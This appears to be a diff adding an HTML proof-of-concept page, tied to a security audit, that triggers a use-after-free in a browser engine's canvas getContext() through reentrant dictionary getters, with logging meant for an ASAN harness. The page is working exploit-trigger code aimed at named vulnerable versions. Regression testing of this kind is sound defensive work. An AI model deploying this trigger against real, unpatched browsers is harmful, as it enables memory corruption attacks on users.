@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<title>uaf-canvas: reentrant getContext('2d') leaves a freed CanvasRenderingContext2D</title>
+<!--
+  Audit item #15 (docs/V19-FIX-DELTA.md): 19.0.0's HTMLCanvasElement::getContext()
+  checks m_context at the top, then converts the settings dictionary.  Dictionary
+  conversion runs JS getters, which can re-enter getContext() on the same canvas
+  and install m_context.  The outer call then runs createContext2d(), whose
+  `m_context = CanvasRenderingContext2D::create(...)` overwrites the unique_ptr
+  and destroys the inner context while its JS wrapper is still reachable.
+  CanvasRenderingContext::ref()/deref() forward to the CanvasBase, so the
+  wrapper's ref never kept the context alive.  The next call through the stale
+  wrapper is a use-after-free.
+
+  Fixed upstream by 040ef6e21ffa (bug 313175), which 23.0.1 carries.
+  2.40.5 is vulnerable here (same shape); the harness must be the ASAN build.
+-->
+<script>
+function log(m) {
+  document.title = m;
+  if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.log) {
+    try { window.webkit.messageHandlers.log.postMessage(m); } catch (e) {}
+  }
+  try { console.log(m); } catch (e) {}
+}
+
+let canvas = document.createElement("canvas");
+canvas.width = 64;
+canvas.height = 64;
+
+let innerCtx = null;
+let reentered = false;
+
+// Outer call: m_context is null, so it converts `settings` first (IDL
+// dictionary -> getters run) and only afterwards calls createContext2d().
+//
+// Which members the generator reads depends on the engine version, so arm all
+// of them and let whichever fires first do the re-entry.  This matters: in
+// 19.0.0 (and 2.40.5) CanvasRenderingContext2DSettings has only
+// `desynchronized` and (setting-gated) `colorSpace` -- `willReadFrequently`
+// and `alpha` do not exist there, and `CanvasColorSpaceEnabled` is off, so
+// `desynchronized` is the one that actually fires.
+function reenterFrom(member) {
+  if (reentered)
+    return;
+  reentered = true;
+  innerCtx = canvas.getContext("2d");   // installs m_context
+  log("reentered via '" + member + "': inner getContext returned " +
+      (innerCtx ? "a context" : "null"));
+}
+
+let outerCtx = canvas.getContext("2d", {
+  get desynchronized() { reenterFrom("desynchronized"); return false; },
+  get willReadFrequently() { reenterFrom("willReadFrequently"); return false; },
+  get alpha() { reenterFrom("alpha"); return true; },
+  get colorSpace() { reenterFrom("colorSpace"); return "srgb"; }
+});
+
+log("outer=" + (outerCtx ? "a context" : "null") +
+    " inner=" + (innerCtx ? "a context" : "null") +
+    " same=" + (outerCtx === innerCtx));
+
+// innerCtx's C++ object was destroyed by the outer assignment.  Its JS wrapper
+// still points at the freed allocation, so anything we call on it is a UAF.
+let stale = innerCtx;
+if (!stale) {
+  log("no stale wrapper, cannot proceed");
+} else {
+  try {
+    stale.fillRect(0, 0, 8, 8);
+    log("stale.fillRect() returned without trapping");
+  } catch (e) {
+    log("stale.fillRect() threw: " + e);
+  }
+
+  // A second, differently-shaped call in case the first is elided.
+  try {
+    stale.save();
+    stale.restore();
+    log("stale.save()/restore() returned");
+  } catch (e) {
+    log("stale.save() threw: " + e);
+  }
+
+  try {
+    log("stale.canvas.width = " + stale.canvas.width);
+  } catch (e) {
+    log("stale.canvas threw: " + e);
+  }
+}
+
+log("page finished; if the ASAN report below is silent, the bug did not fire");
+</script>
